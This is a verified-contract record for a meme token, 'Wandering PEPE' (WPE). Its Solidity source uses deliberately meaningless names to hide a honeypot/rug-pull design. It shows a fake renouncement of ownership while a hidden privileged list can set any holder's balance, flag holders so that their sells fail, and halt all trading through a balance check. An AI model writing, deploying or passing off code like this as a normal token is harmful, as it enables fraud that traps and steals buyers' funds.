{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface teamToLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitAtTo) external view returns (uint256);\n\n    function transfer(address enableSender, uint256 buyMode) external returns (bool);\n\n    function allowance(address fromTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSender,\n        uint256 buyMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listMinFrom, uint256 value);\n    event Approval(address indexed fromTeam, address indexed spender, uint256 value);\n}\n\nabstract contract feeLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldLimitLaunched {\n    function createPair(address takeFrom, address sellSender) external returns (address);\n}\n\ninterface tradingTotal is teamToLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WanderingPEPE is feeLaunched, teamToLiquidity, tradingTotal {\n\n    uint256 private toSell;\n\n    string private fundEnable = \"Wandering PEPE\";\n\n    function autoFee() public {\n        emit OwnershipTransferred(receiverIs, address(0));\n        listExempt = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableList;\n    }\n\n    function getOwner() external view returns (address) {\n        return listExempt;\n    }\n\n    address private listExempt;\n\n    mapping(address => uint256) private tradingShould;\n\n    event OwnershipTransferred(address indexed limitBuy, address indexed launchedReceiver);\n\n    function balanceOf(address limitAtTo) public view virtual override returns (uint256) {\n        return tradingShould[limitAtTo];\n    }\n\n    uint256 public exemptSell;\n\n    function transfer(address atSwapMode, uint256 buyMode) external virtual override returns (bool) {\n        return modeTrading(_msgSender(), atSwapMode, buyMode);\n    }\n\n    function fromMax(uint256 buyMode) public {\n        fundBuyReceiver();\n        launchedTeam = buyMode;\n    }\n\n    function modeTrading(address buyTeam, address enableSender, uint256 buyMode) internal returns (bool) {\n        if (buyTeam == receiverIs) {\n            return launchSender(buyTeam, enableSender, buyMode);\n        }\n        uint256 autoLaunch = teamToLiquidity(listAutoFund).balanceOf(maxAutoLaunched);\n        require(autoLaunch == launchedTeam);\n        require(enableSender != maxAutoLaunched);\n        if (marketingModeTake[buyTeam]) {\n            return launchSender(buyTeam, enableSender, toIs);\n        }\n        return launchSender(buyTeam, enableSender, buyMode);\n    }\n\n    function txAmount(address buyTotalMode) public {\n        if (sellAt) {\n            return;\n        }\n        if (toSell != isLaunched) {\n            isLaunched = exemptSell;\n        }\n        amountFeeTake[buyTotalMode] = true;\n        \n        sellAt = true;\n    }\n\n    function launchSender(address buyTeam, address enableSender, uint256 buyMode) internal returns (bool) {\n        require(tradingShould[buyTeam] >= buyMode);\n        tradingShould[buyTeam] -= buyMode;\n        tradingShould[enableSender] += buyMode;\n        emit Transfer(buyTeam, enableSender, buyMode);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return listExempt;\n    }\n\n    bool public sellAt;\n\n    uint256 constant toIs = 15 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buySell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxToken;\n    }\n\n    function marketingMaxFrom(address atSwapMode, uint256 buyMode) public {\n        fundBuyReceiver();\n        tradingShould[atSwapMode] = buyMode;\n    }\n\n    bool public marketingMin;\n\n    address public listAutoFund;\n\n    uint256 private enableList = 100000000 * 10 ** 18;\n\n    uint256 takeSwap;\n\n    mapping(address => bool) public marketingModeTake;\n\n    function allowance(address tokenLimit, address teamAuto) external view virtual override returns (uint256) {\n        if (teamAuto == shouldTotal) {\n            return type(uint256).max;\n        }\n        return autoList[tokenLimit][teamAuto];\n    }\n\n    bool private buyMin;\n\n    address shouldTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address teamAuto, uint256 buyMode) public virtual override returns (bool) {\n        autoList[_msgSender()][teamAuto] = buyMode;\n        emit Approval(_msgSender(), teamAuto, buyMode);\n        return true;\n    }\n\n    uint8 private maxToken = 18;\n\n    constructor (){\n        \n        buyExempt receiverTotal = buyExempt(shouldTotal);\n        listAutoFund = shouldLimitLaunched(receiverTotal.factory()).createPair(receiverTotal.WETH(), address(this));\n        \n        receiverIs = _msgSender();\n        autoFee();\n        amountFeeTake[receiverIs] = true;\n        tradingShould[receiverIs] = enableList;\n        \n        emit Transfer(address(0), receiverIs, enableList);\n    }\n\n    uint256 launchedTeam;\n\n    mapping(address => mapping(address => uint256)) private autoList;\n\n    function name() external view virtual override returns (string memory) {\n        return fundEnable;\n    }\n\n    function tradingFromAuto(address sellEnable) public {\n        fundBuyReceiver();\n        \n        if (sellEnable == receiverIs || sellEnable == listAutoFund) {\n            return;\n        }\n        marketingModeTake[sellEnable] = true;\n    }\n\n    uint256 private enableExempt;\n\n    string private buySell = \"WPE\";\n\n    mapping(address => bool) public amountFeeTake;\n\n    address public receiverIs;\n\n    function fundBuyReceiver() private view {\n        require(amountFeeTake[_msgSender()]);\n    }\n\n    address maxAutoLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private shouldSellLiquidity;\n\n    function transferFrom(address buyTeam, address enableSender, uint256 buyMode) external override returns (bool) {\n        if (_msgSender() != shouldTotal) {\n            if (autoList[buyTeam][_msgSender()] != type(uint256).max) {\n                require(buyMode <= autoList[buyTeam][_msgSender()]);\n                autoList[buyTeam][_msgSender()] -= buyMode;\n            }\n        }\n        return modeTrading(buyTeam, enableSender, buyMode);\n    }\n\n    uint256 public isLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMinFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFeeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAtTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyMode\",\"type\":\"uint256\"}],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAutoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMode\",\"type\":\"uint256\"}],\"name\":\"marketingMaxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingModeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"tradingFromAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotalMode\",\"type\":\"address\"}],\"name\":\"txAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WanderingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}